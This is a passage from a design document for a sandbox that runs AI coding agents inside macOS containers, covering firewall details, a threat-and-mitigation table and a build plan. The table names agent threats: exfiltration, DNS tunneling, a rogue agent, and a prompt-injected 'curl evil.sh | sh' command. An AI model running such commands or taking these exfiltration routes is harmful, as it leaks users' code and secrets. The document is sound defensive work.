* **`apple/container` DNS resolver address.** In apple/container the resolver in `/etc/resolv.conf` may not be `127.0.0.11` (that is Docker-specific). We parse it dynamically with `awk`.
* **GitHub meta API might be unreachable on first boot.** If the egress firewall hasn't been set yet (it hasn't — this is bootstrap), the `curl api.github.com/meta` succeeds because the firewall hasn't applied DROP yet. This is intentional and correct.
* **`aggregate` is Debian-only.** Restrict base image recommendations to Debian/Ubuntu in v0.1 docs.
* **Script name collision with devcontainer feature.** We name our script `project-sandbox-init-firewall` to avoid the issue #32113 overwrite problem.
* **IPv6 firewall symmetry.** The script runs `ip6tables` mirroring all IPv4 rules. The `ip6_tables` kernel module must be loadable (`NET_ADMIN` capability covers this). If the probe fails, the script falls back to `sysctl net.ipv6.conf.all.disable_ipv6=1`; if that also fails it aborts (unless `--no-ipv6-firewall` is set). ICMPv6 is explicitly allowed before the DROP policy — omitting it would break neighbor discovery and cause even whitelisted IPv6 traffic to fail.
* **`ipset` family typing.** `allowed-ipv4` uses `family inet` and `allowed-ipv6` uses `family inet6`. Attempting to add an IPv6 address to an inet set (or vice versa) would fail silently with `--exist`; keeping them separate avoids this. The `match-set` rules reference each set from the correct (`iptables` vs `ip6tables`) command.
* **AAAA resolution timing.** `dig AAAA` runs for each domain at firewall startup. CDN-hosted domains (e.g. `api.anthropic.com` on Cloudflare) resolve to many AAAA records which may change between restarts. This is unavoidable with a DNS-resolution-at-startup design; the allowlist is rebuilt fresh on each container start.
* **Firewall timing.** The entrypoint runs `sudo project-sandbox-init-firewall` *before* `exec`'ing the agent. There is a short window during entrypoint setup (identity + credential copy) where the firewall is not yet up. No agent code runs during this window, so this is acceptable. For paranoid use, move the firewall invocation to the very top of the entrypoint (before identity wiring).

### 13.3 Claude Code

* OAuth credentials in Keychain on macOS. Detect with `security find-generic-password -s "Claude Code-credentials"` and instruct the user to run `claude setup-token` for long-lived use.
* `settings.json` arrays merge across layers. Override by controlling `CLAUDE_CONFIG_DIR`.
* With `--credentials-mode ro`, refresh tokens cannot be written back; the user re-authenticates more often.

### 13.4 Codex

* Project `.codex/config.toml` only loaded for trusted projects. We sidestep with `CODEX_HOME`.
* `auth.json` refresh needs rw credentials mode.

### 13.5 Jujutsu

* Does not read `~/.gitconfig` for identity. We write `~/.config/jj/config.toml` via the entrypoint.
* `jj config set --user user.name "..."` has apostrophe parsing bugs ([#5748](https://github.com/jj-vcs/jj/issues/5748)). We write the TOML directly.

---

## 14. Security model summary

| Threat | Mitigation |
|---|---|
| Agent reads `~/.ssh`, `~/Library/...` | VM boundary (apple/container `Virtualization.framework`) |
| Agent deletes the wrong project dir | Only `/workspace` is mounted |
| Agent exfiltrates workspace to arbitrary server | `iptables` egress allowlist (default DROP + domain whitelist) |
| Agent calls home to attacker's server | Same |
| DNS tunneling exfiltration | DNS restricted to internal resolver only |
| Prompt injection drives `curl evil.sh \| sh` | Blocked unless the shell binary's C2 is on the allowlist |
| Malicious npm post-install scripts | Run inside VM as UID 1000; no host access |
| API token leakage to other macOS processes | Token is inside the VM; not in Keychain |
| Agent modifies main branch while working | Worktree mode: only the worktree branch is mounted; main checkout untouched |
| Unsupervised agent goes rogue | Firewall + worktree isolation; timeout kills the container; diff review before integration |
| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) + `disable_update_check: true` (Codex) |

What we **do not** protect against:
* Exfiltration via whitelisted endpoints (e.g. committing secrets to a GitHub repo) — defense requires secret scanning, not a firewall.
* API token abuse (the agent's token is by definition available to the agent).
* Egress via IPv6 when `ip6_tables` is unavailable AND `sysctl` disable also fails AND `--no-ipv6-firewall` is set — in that specific combination only.

---

## 15. Build/validate plan (recommended PR sequence)

1. **PR 1** — Package skeleton + CLI arg parsing + `--help` smoke test.
2. **PR 2** — `git_identity.py` + jj/git config templates (unit tests with subprocess mocks).
3. **PR 3** — Dockerfile + entrypoint templates; assert golden-file equality.
4. **PR 4** — `firewall.py` + `init-firewall.sh.j2`; unit-test rendered output (domain list, Jinja conditionals for `allow_openai` and `extra_domains`).
5. **PR 5** — `container_cli.py` wrapper (mock subprocess for unit tests; integration test on macOS 15+ CI if available).
6. **PR 6** — Sanitized config generation (Claude + Codex); fixture tests verifying no sandbox/approval keys in output.
7. **PR 7** — Launcher generation + end-to-end test: `python:3.12-slim` base, `project-sandbox-run bash`, verify `whoami`=`agent`, `iptables -L` shows DROP default policy, `curl https://example.com` is blocked.
7b. **PR 7b** — Worktree mode (`worktree.py`): setup/teardown, git worktree lifecycle, jj workspace shim, collision detection. Unit tests with a real bare repo fixture; integration test verifying the worktree branch receives commits the main checkout does not see.
8. **PR 8** — Unsupervised session mode (`session.py`): prompt delivery (env var + file), log file writing with `PIPESTATUS`, timeout wrapping, `claude-headless`/`codex-headless` entrypoint dispatch. Integration test: fire a one-shot prompt, verify log file contains agent output and exit code is propagated.
9. **PR 9** — Devcontainer generation (`devcontainer.py` + `devcontainer.json.j2` + `project-sandbox-devcontainer-init`); test round-trip: generate → open in VS Code devcontainer → verify firewall active, `whoami`=`agent`, credentials present.
10. **PR 10** — `--rebuild`, `--refresh-config`, `--dry-run`, `--no-firewall`, `--extra-domain`; full README.
11. **PR 11** — PyPI release; verify `uvx project-sandbox --help` on fresh macOS 26 box.

---

## 16. Summary of design decisions relative to Anthropic's reference

The firewall design follows Anthropic's `anthropics/claude-code/.devcontainer/init-firewall.sh` closely in structure and intent, with targeted improvements:

- **Idempotent `ipset add --exist`** — fixes the duplicate-IP crash seen in real deployments.
- **DNS restriction to internal resolver** — closes the DNS tunneling exfiltration gap.
- **Graceful DNS failure** — container starts with a partial allowlist rather than aborting (pattern from community forks like centminmod/claude-code-devcontainers).
- **No VS Code domains** — not needed for our terminal-only use case.
- **Codex (`api.openai.com`) added conditionally** — the upstream is Claude-only.
- **Configurable extra domains via `--extra-domain`** — supports private npm registries, internal API endpoints.
- **Worktree mode** — agent runs in an isolated Git worktree on a named branch; main checkout is never mounted. Post-session integration options: merge, rebase, open PR, or nothing.
- **Unsupervised (fire-and-forget) mode** — starting prompt delivered via env var or bind-mounted file; `-it` removed; output logged to `.project-sandbox/sessions/`; exit code propagated for CI. Composable with worktree mode.
- **Devcontainer output** — identical image, firewall, and sanitized configs available to VS Code / Cursor / Codespaces without requiring `apple/container`; symlinks keep Dockerfile and firewall script as a single source of truth.
- **Full IPv6 parity** — symmetric `ip6tables` allowlist with separate `inet6`-typed ipset; AAAA records resolved for all domains; GitHub's `ipv6` CIDR array consumed from the meta API; `sysctl` fallback when `ip6_tables` is unavailable; ICMPv6 preserved for NDP.
- **Distinct script name (`project-sandbox-init-firewall`)** — avoids overwrite conflict with the devcontainer feature (issue #32113).
